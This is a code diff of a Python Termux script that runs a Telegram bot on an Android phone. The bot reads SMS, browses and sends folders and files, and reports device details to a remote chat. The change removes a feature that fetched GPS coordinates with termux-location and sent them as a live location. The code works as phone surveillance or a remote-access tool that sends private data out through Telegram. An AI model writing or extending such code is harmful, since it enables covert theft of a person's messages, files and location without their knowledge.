@@ -32,43 +32,6 @@ def send_to_telegram(message):
 def escape_markdown(text):
     return re.sub(r'([*_`\[\]])', r'\\\1', text)
 
-# Function to send live location to Telegram
-def send_location_to_telegram(latitude, longitude):
-    url = f"https://api.telegram.org/bot{TOKEN}/sendLocation"
-    data = {
-        "chat_id": CHAT_ID,
-        "latitude": latitude,
-        "longitude": longitude,
-        "live_period": 60  # Live location for 60 seconds
-    }
-    try:
-        response = requests.post(url, data=data)
-        if response.status_code == 200:
-            print("Location sent successfully!")
-        else:
-            print(f"Failed to send location. Status code: {response.status_code}, Response: {response.text}")
-    except Exception as e:
-        print(f"Error sending location: {str(e)}")
-
-# Function to get device's live location using Termux
-def get_device_location():
-    try:
-        # Request location using termux-location command
-        location_info = subprocess.check_output(['termux-location', '--provider', 'gps', '--request', 'last']).decode().strip()
-        location_data = json.loads(location_info)
-
-        # Extract latitude and longitude
-        latitude = location_data.get("latitude")
-        longitude = location_data.get("longitude")
-
-        if latitude and longitude:
-            return latitude, longitude
-        else:
-            return None, None
-    except Exception as e:
-        print(f"Error retrieving location: {str(e)}")
-        return None, None
-
 # Function to get SMS details
 def get_sms():
     try:
@@ -150,7 +113,7 @@ def handle_folder_navigation(folder_name):
     except Exception as e:
         send_to_telegram(f"Error navigating folder: {str(e)}")
 
-# Telegram bot logic to handle file, folder, SMS, device, and location requests
+# Telegram bot logic to handle file, folder, SMS, and device requests
 def handle_telegram_update(update):
     try:
         message = update.get('message', {}).get('text', '')
@@ -162,13 +125,6 @@ def handle_telegram_update(update):
             elif message == "/device":
                 device_info = get_device_info()
                 send_to_telegram(device_info)
-
-            elif message == "/location":
-                latitude, longitude = get_device_location()
-                if latitude and longitude:
-                    send_location_to_telegram(latitude, longitude)
-                else:
-                    send_to_telegram("Unable to retrieve location.")
 
             elif message == "/sdcard":
                 global current_folder
@@ -227,5 +183,5 @@ if __name__ == "__main__":
     send_to_telegram(f"Current folder: `{current_folder}`")
     handle_folder_navigation("")  # Show initial folder contents
     
-    # Step 2: Listen for user input (folder, file, SMS, device info, or location)
+    # Step 2: Listen for user input (folder, file, SMS, or device info)
     listen_for_updates()
